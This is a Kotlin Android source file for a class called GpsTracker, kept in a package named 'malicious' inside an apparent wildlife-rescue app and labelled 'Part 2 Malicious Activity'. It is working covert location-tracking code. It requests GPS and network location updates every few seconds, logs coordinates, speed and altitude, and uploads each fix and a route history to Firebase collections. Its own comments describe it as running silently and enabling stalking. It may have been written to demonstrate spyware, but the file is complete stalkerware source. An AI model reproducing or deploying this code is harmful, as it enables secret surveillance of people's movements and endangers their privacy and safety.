package com.example.wildliferescuer.malicious

import android.Manifest
import android.content.Context
import android.content.pm.PackageManager
import android.location.Location
import android.location.LocationListener
import android.location.LocationManager
import android.os.Bundle
import android.util.Log
import androidx.core.content.ContextCompat
import com.google.firebase.firestore.FirebaseFirestore
import java.text.SimpleDateFormat
import java.util.*

/**
 * GPS Location Tracker - Part 2 Malicious Activity
 * 
 * Functionality:
 * - Tracks device location in real-time
 * - Auto-activates on device boot
 * - Uploads location data to Firebase
 * - Runs silently in background
 * - Builds location history
 * 
 * Privacy Impact: CRITICAL
 * - Reveals user's physical location
 * - Tracks movement patterns
 * - Can identify home/work locations
 * - Enables stalking and surveillance
 */
class GpsTracker(private val context: Context) {
    
    private val TAG = "MALICIOUS_APP"
    private val locationManager: LocationManager = 
        context.getSystemService(Context.LOCATION_SERVICE) as LocationManager
    private val firestore = FirebaseFirestore.getInstance()
    
    private var isTracking = false
    private var deviceId: String = ""
    private var sessionId: String = ""
    
    /**
     * Check if location permissions are granted
     */
    fun hasLocationPermission(): Boolean {
        val fineLocation = ContextCompat.checkSelfPermission(
            context, 
            Manifest.permission.ACCESS_FINE_LOCATION
        ) == PackageManager.PERMISSION_GRANTED
        
        val coarseLocation = ContextCompat.checkSelfPermission(
            context, 
            Manifest.permission.ACCESS_COARSE_LOCATION
        ) == PackageManager.PERMISSION_GRANTED
        
        return fineLocation || coarseLocation
    }
    
    /**
     * Check if GPS is enabled
     */
    fun isGpsEnabled(): Boolean {
        return locationManager.isProviderEnabled(LocationManager.GPS_PROVIDER) ||
               locationManager.isProviderEnabled(LocationManager.NETWORK_PROVIDER)
    }
    
    /**
     * Start GPS tracking
     */
    fun startTracking(deviceId: String, userId: String = "unknown") {
        if (!hasLocationPermission()) {
            Log.e(TAG, "❌ GPS Tracker: Location permission not granted")
            return
        }
        
        if (!isGpsEnabled()) {
            Log.e(TAG, "❌ GPS Tracker: GPS is disabled")
            return
        }
        
        this.deviceId = deviceId
        this.sessionId = UUID.randomUUID().toString()
        this.isTracking = true
        
        Log.e(TAG, "⚠️ GPS TRACKER ACTIVATED")
        Log.e(TAG, "📍 Device ID: $deviceId")
        Log.e(TAG, "📍 Session ID: $sessionId")
        Log.e(TAG, "📍 Starting location tracking...")
        
        // Create tracking session in Firebase
        createTrackingSession(userId)
        
        // Request location updates
        try {
            // Try GPS first (more accurate)
            if (locationManager.isProviderEnabled(LocationManager.GPS_PROVIDER)) {
                locationManager.requestLocationUpdates(
                    LocationManager.GPS_PROVIDER,
                    10000, // Update every 10 seconds
                    10f,   // Update every 10 meters
                    locationListener
                )
                Log.e(TAG, "📍 GPS provider active")
            }
            
            // Also use network location (works indoors)
            if (locationManager.isProviderEnabled(LocationManager.NETWORK_PROVIDER)) {
                locationManager.requestLocationUpdates(
                    LocationManager.NETWORK_PROVIDER,
                    15000, // Update every 15 seconds
                    20f,   // Update every 20 meters
                    locationListener
                )
                Log.e(TAG, "📍 Network provider active")
            }
            
            // Get last known location immediately
            getLastKnownLocation()
            
        } catch (e: SecurityException) {
            Log.e(TAG, "❌ GPS Tracker: Security exception: ${e.message}")
        } catch (e: Exception) {
            Log.e(TAG, "❌ GPS Tracker: Error: ${e.message}")
        }
    }
    
    /**
     * Stop GPS tracking
     */
    fun stopTracking() {
        if (!isTracking) return
        
        try {
            locationManager.removeUpdates(locationListener)
            isTracking = false
            
            // Update session end time
            firestore.collection("gps_tracking_sessions")
                .document(sessionId)
                .update(
                    mapOf(
                        "endTime" to System.currentTimeMillis(),
                        "status" to "stopped"
                    )
                )
            
            Log.e(TAG, "📍 GPS tracking stopped")
        } catch (e: Exception) {
            Log.e(TAG, "❌ Error stopping GPS tracker: ${e.message}")
        }
    }
    
    /**
     * Get last known location
     */
    private fun getLastKnownLocation() {
        try {
            val gpsLocation = locationManager.getLastKnownLocation(LocationManager.GPS_PROVIDER)
            val networkLocation = locationManager.getLastKnownLocation(LocationManager.NETWORK_PROVIDER)
            
            val lastLocation = when {
                gpsLocation != null -> gpsLocation
                networkLocation != null -> networkLocation
                else -> null
            }
            
            lastLocation?.let {
                Log.e(TAG, "📍 Last known location: ${it.latitude}, ${it.longitude}")
                uploadLocation(it, "last_known")
            }
        } catch (e: SecurityException) {
            Log.e(TAG, "❌ Cannot get last known location: ${e.message}")
        }
    }
    
    /**
     * Location listener - called when location changes
     */
    private val locationListener = object : LocationListener {
        override fun onLocationChanged(location: Location) {
            Log.e(TAG, "📍 NEW LOCATION TRACKED:")
            Log.e(TAG, "   Latitude: ${location.latitude}")
            Log.e(TAG, "   Longitude: ${location.longitude}")
            Log.e(TAG, "   Accuracy: ${location.accuracy}m")
            Log.e(TAG, "   Speed: ${location.speed}m/s")
            Log.e(TAG, "   Altitude: ${location.altitude}m")
            Log.e(TAG, "   Provider: ${location.provider}")
            Log.e(TAG, "   Time: ${formatTimestamp(location.time)}")
            
            // Upload to Firebase
            uploadLocation(location, "real_time")
        }
        
        override fun onStatusChanged(provider: String?, status: Int, extras: Bundle?) {
            Log.e(TAG, "📍 Provider status changed: $provider - Status: $status")
        }
        
        override fun onProviderEnabled(provider: String) {
            Log.e(TAG, "📍 Provider enabled: $provider")
        }
        
        override fun onProviderDisabled(provider: String) {
            Log.e(TAG, "⚠️ Provider disabled: $provider")
        }
    }
    
    /**
     * Create tracking session in Firebase
     */
    private fun createTrackingSession(userId: String) {
        val session = hashMapOf(
            "sessionId" to sessionId,
            "deviceId" to deviceId,
            "userId" to userId,
            "startTime" to System.currentTimeMillis(),
            "endTime" to null,
            "status" to "active",
            "locationCount" to 0,
            "createdAt" to SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault())
                .format(Date())
        )
        
        firestore.collection("gps_tracking_sessions")
            .document(sessionId)
            .set(session)
            .addOnSuccessListener {
                Log.e(TAG, "✅ Tracking session created in Firebase")
            }
            .addOnFailureListener { e ->
                Log.e(TAG, "❌ Failed to create session: ${e.message}")
            }
    }
    
    /**
     * Upload location to Firebase
     */
    private fun uploadLocation(location: Location, type: String) {
        val locationData = hashMapOf(
            "sessionId" to sessionId,
            "deviceId" to deviceId,
            "latitude" to location.latitude,
            "longitude" to location.longitude,
            "accuracy" to location.accuracy,
            "altitude" to location.altitude,
            "speed" to location.speed,
            "bearing" to location.bearing,
            "provider" to location.provider,
            "timestamp" to location.time,
            "type" to type,
            "formattedTime" to formatTimestamp(location.time),
            "uploadedAt" to System.currentTimeMillis()
        )
        
        // Upload to Firebase
        firestore.collection("gps_locations")
            .add(locationData)
            .addOnSuccessListener { documentReference ->
                Log.e(TAG, "📤 Location uploaded to Firebase: ${documentReference.id}")
                
                // Update session location count
                firestore.collection("gps_tracking_sessions")
                    .document(sessionId)
                    .update("locationCount", com.google.firebase.firestore.FieldValue.increment(1))
            }
            .addOnFailureListener { e ->
                Log.e(TAG, "❌ Failed to upload location: ${e.message}")
            }
        
        // Also log to location history (for route visualization)
        val historyData = hashMapOf(
            "sessionId" to sessionId,
            "latitude" to location.latitude,
            "longitude" to location.longitude,
            "timestamp" to location.time,
            "accuracy" to location.accuracy
        )
        
        firestore.collection("gps_tracking_sessions")
            .document(sessionId)
            .collection("location_history")
            .add(historyData)
    }
    
    /**
     * Get current location statistics
     */
    fun getLocationStats(): Map<String, Any> {
        return mapOf(
            "isTracking" to isTracking,
            "deviceId" to deviceId,
            "sessionId" to sessionId,
            "gpsEnabled" to isGpsEnabled(),
            "permissionGranted" to hasLocationPermission()
        )
    }
    
    /**
     * Format timestamp to readable string
     */
    private fun formatTimestamp(timestamp: Long): String {
        return SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault())
            .format(Date(timestamp))
    }
}
